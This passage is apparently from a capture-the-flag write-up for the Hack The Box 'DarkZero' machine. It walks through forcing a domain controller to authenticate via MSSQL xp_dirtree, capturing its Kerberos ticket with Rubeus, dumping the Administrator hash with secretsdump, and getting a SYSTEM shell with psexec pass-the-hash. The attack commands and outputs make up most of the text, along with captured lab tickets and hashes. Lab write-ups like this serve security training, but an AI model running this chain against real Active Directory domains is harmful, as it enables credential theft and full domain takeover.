ZHCH+1licf1ditwxqZExA+k1fwHE4SRDyujKarfwV9w6F1NDbTMS+p1sOL4GeA/WanVT0J1L/P+gCo5Jp1/Jz/eAwc8dgrJu3QKE68EaWWpExo1BbBWeNeNRfvpgsVNAyzR5+7b342+2Lexi5sU6/3nJUvIm97o4HjMIHgoAMCAQCigdgEgdV9gdIwgc+ggcwwgckwgcagKzApoAMCARKhIgQgJayyJ1zzwjMeM19kR4nI9Vdc70+9WFINUbmCWBRPm9ehDhsMREFSS1pFUk8uRVhUohIwEKADAgEBoQkwBxsFREMwMiSjBwMFAEChAAClERgPMjAyNTEwMDYyMTQxNDZaphEYDzIwMjUxMDA3MDYzNDIyWqcRGA8yMDI1MTAxMzIwMzQyMlqoDhsMREFSS1pFUk8uRVhUqSEwH6ADAgECoRgwFhsGa3JidGd0GwxEQVJLWkVSTy5IVEI=

[*] Ticket cache size: 7
```

 But I notice we're getting tickets from the **DARKZERO.EXT** domain (DC02), not the **DARKZERO.HTB** domain (DC01). So in that `mssqlclient` as DC01 run some random command:

```bash
SQL (darkzero\john.w  guest@master)> xp_dirtree \\DC02.darkzero.ext\sfsdafasd
subdirectory   depth   file
------------   -----   ----
```

And in Rubeus we got new ticket encoded:

```bash
[*] Ticket cache size: 7


[*] 10/6/2025 10:39:50 PM UTC - Found new TGT:

  User                  :  DC01$@DARKZERO.HTB
  StartTime             :  10/6/2025 1:59:41 PM
  EndTime               :  10/6/2025 11:59:41 PM
  RenewTill             :  10/13/2025 1:59:41 PM
  Flags                 :  name_canonicalize, pre_authent, renewable, forwarded, forwardable
  Base64EncodedTicket   :

    doIFjDCCBYigAwIBBaEDAgEWooIElDCCBJBhggSMMIIEiKADAgEFoQ4bDERBUktaRVJPLkhUQqIhMB+gAwIBAqEYMBYbBmtyYnRndBsMREFSS1pFUk8uSFRCo4IETDCCBEigAwIBEqEDAgECooIEOgSCBDahdMrmzWOFuQAMIN+OdS442Nb/TxAnErrXvx22U9vZBKuHe0ULfj1m9cmLbUKImnc2auQoZkDFm3I393zjb70JSr8/FmbClUBhlqb7qMZfypC1O+gXdAZhzCZKlX2I3T4tCTUZauyaiH45TKq5cf4b5jqc6FG2UjBx3FasEBCO2z+sVDPUCGdvcdMvB+AjGiZFelVK7nfp/4nGplrHlBboMdov7dQQ+H4PVcCj/nRAx56c6SRe0luAgV+KpYo0e9QwHd6di5v+b4ASw1WVfKgpZ48sm8nKKEw/ML+J3jZGp/ZI06l6WHujUZXPm1yYGsKO5eshHujSL3hDMiW13xfNKj9vu+VzJ6ndbt1yb1RKQLnb69GaBRC/QtSQP2emnx2xqXA2S3ASylHNVGXE5QesuF3YOR2HqqVW8xSNm47002NNUkGa6pJ1uAUMyTonL2IxU8+CaYJc5blirNtZ37pgyu9bvhHMQAXGadf3thHPG82e7Wridd+4zKY2OhBiBmS2nY6O1n0tfLWCNeJ/7rBcxcLc41K/XXxPxPWm5Z3m3tdRq1Lw6nWjEPuhR088isknZz5iNuT0xdL9KOFPNHrSeADaIyt74GqgUbL7J8KvPzwCyB4gT8sjfe9aY7Cio+oTHJtUzwYp7J/3nQ3TM4nxZ/CDIPKlUseG7lvn7hXMh63/35s2EzuwsuqsZv//1gJG+Z3pFmdzLmD/ue2NGiGTPRQmJgXAIi+wwXarlzcP0ccmdX8/olPRDHpuKAiHMcGrJRtA0CjgY69QeytBkZ5okq9f0Yvosi8lR9puVLAs2qDl3GflZKH02rUhVbvuJxwBYxOH3/R09mRkLdIbx0Zo5gQmStvyjYGn271AOaYxAoUbryr6/fYrw8kk93gp3p8yQQ/t0uUgerv0b64rS6Vhc+8CCqJvjq8qtKfyGCDvSX9Ly1aEui4PjGb1V4DxpIBMMXINWgH5D+8mrGQ9ZbqUUW+8WxBFLQPdniDr+oA5Rb8mf5rQnc2bcCjIA086TPYxKb5NpTROm19nfliyoC1x8V6d19U087SzwDKH0oOhmu04+7Hk8nEjeQ/h/ki8cT6mmesdGjsLKTnAeAljPuApLD0cw0SOriNu5squjLn6Cjk2ZzPS86X0lk8PEArccVlekh/xi5O6Ze4MmvQ04HotOpWViGKwAEWWISlJWOhQvLRZvh4JlxTdDOuA291bXCUMR8I8rfbcBbohvUb8GWbQouhST906AyrCnm/cawbxRNSNzyvvleiA3JvMgInqd/lUfxAPVlaKxWh55HHAqjmVUecRF3Cb6XcAO5rbM1r8fAUzzINmBtmS8ms1CGuI32KfaTgq0XGnF+4xL01WmSn5J0ODPOYsgaYTxh+lC/QebOkJrWJlDrOflBFxSATqtFy5KCbeZOsyBmcDzIMtaE9mb008GKA6o4HjMIHgoAMCAQCigdgEgdV9gdIwgc+ggcwwgckwgcagKzApoAMCARKhIgQgPSYpfkJUlLnyS3+RQaDE0lne8yb3gii4V8IMIxZURqGhDhsMREFSS1pFUk8uSFRCohIwEKADAgEBoQkwBxsFREMwMSSjBwMFAGChAAClERgPMjAyNTEwMDYyMDU5NDFaphEYDzIwMjUxMDA3MDY1OTQxWqcRGA8yMDI1MTAxMzIwNTk0MVqoDhsMREFSS1pFUk8uSFRCqSEwH6ADAgECoRgwFhsGa3JidGd0GwxEQVJLWkVSTy5IVEI=

[*] Ticket cache size: 8
```

```bash
❯ nvim ticket.bs4.kirbi
❯ cat ticket.bs4.kirbi | base64 -d > ticket.kirbi
```

```bash
git clone https://github.com/Zer1t0/ticket_converter
cd ticket_converter
pip install -r requirements.txt
```

```bash
❯ ticketConverter.py ../ticket.kirbi dc01_admin.ccache
/usr/lib/python3.13/site-packages/impacket/version.py:12: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.
  import pkg_resources
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[*] converting kirbi to ccache...
[+] done
```

```bash
❯ export KRB5CCNAME=dc01_admin.ccache
❯ klist
Ticket cache: FILE:dc01_admin.ccache
Default principal: DC01$@DARKZERO.HTB

Valid starting       Expires              Service principal
10/07/2025 02:44:41  10/07/2025 12:44:41  krbtgt/DARKZERO.HTB@DARKZERO.HTB
        renew until 10/14/2025 02:44:41
```

```bash
❯ /usr/bin/secretsdump.py -k -no-pass 'darkzero.htb/DC01$@DC01.darkzero.htb'
/usr/lib/python3.13/site-packages/impacket/version.py:12: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.
  import pkg_resources
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[-] Policy SPN target name validation might be restricting full DRSUAPI dump. Try -just-dc-user
[*] Cleaning up...
❯ /usr/bin/secretsdump.py -k -no-pass -just-dc-user administrator 'darkzero.htb/DC01$@DC01.darkzero.htb'
/usr/lib/python3.13/site-packages/impacket/version.py:12: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.
  import pkg_resources
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
[-] Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
[*] Something went wrong with the DRSUAPI approach. Try again with -use-vss parameter
[*] Cleaning up...
```

```bash
❯ sudo ntpdate 10.10.11.89

# Or install and use ntpd
sudo systemctl stop systemd-timesyncd
sudo ntpdate -s 10.10.11.89
[sudo] password for at0m:
 7 Oct 04:56:13 ntpdate[58471]: step time server 10.10.11.89 offset +25199.815844 sec
❯ /usr/bin/secretsdump.py -k -no-pass -just-dc-user administrator 'darkzero.htb/DC01$@DC01.darkzero.htb'
/usr/lib/python3.13/site-packages/impacket/version.py:12: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.
  import pkg_resources
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:5917507bdf2ef2c2b0a869a1cba40726:::
[*] Kerberos keys grabbed
Administrator:0x14:2f8efea2896670fa78f4da08a53c1ced59018a89b762cbcf6628bd290039b9cd
Administrator:0x13:a23315d970fe9d556be03ab611730673
Administrator:aes256-cts-hmac-sha1-96:d4aa4a338e44acd57b857fc4d650407ca2f9ac3d6f79c9de59141575ab16cabd
Administrator:aes128-cts-hmac-sha1-96:b1e04b87abab7be2c600fc652ac84362
Administrator:0x17:5917507bdf2ef2c2b0a869a1cba40726
[*] Cleaning up...
```

```bash
❯ /usr/bin/psexec.py -hashes :5917507bdf2ef2c2b0a869a1cba40726 administrator@10.10.11.89
/usr/lib/python3.13/site-packages/impacket/version.py:12: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.
  import pkg_resources
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[*] Requesting shares on 10.10.11.89.....
[*] Found writable share ADMIN$
[*] Uploading file ptpeLXlL.exe
[*] Opening SVCManager on 10.10.11.89.....
[*] Creating service PrFI on 10.10.11.89.....
[*] Starting service PrFI.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.26100.4652]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\System32> whoami
nt authority\system

C:\Windows\System32> powershell
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows


PS C:\Windows\System32>

cat c:\Users\Administrator\Desktop\root.txt

PS C:\Windows\System32> cat c:\Users\Administrator\Desktop\root.txt
1ac915ee60f9a73d4f4ccff20ed1bdd9
```

---
